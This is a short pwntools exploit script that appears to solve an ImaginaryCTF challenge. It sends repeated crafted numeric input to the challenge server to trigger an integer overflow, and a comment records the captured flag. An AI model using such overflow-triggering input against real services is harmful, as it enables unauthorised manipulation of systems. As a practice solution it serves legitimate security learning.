from pwn import remote

io = remote("puzzler7.imaginaryctf.org", 1015)
tot = 1000000
send = b''
while tot > 0:
    send+=b'1\n4294\n'
    tot -= 4294
    print(tot)
io.sendafter(b">>> ", send)
io.interactive()
# ictf{integer_overflow_strikes_again!!}
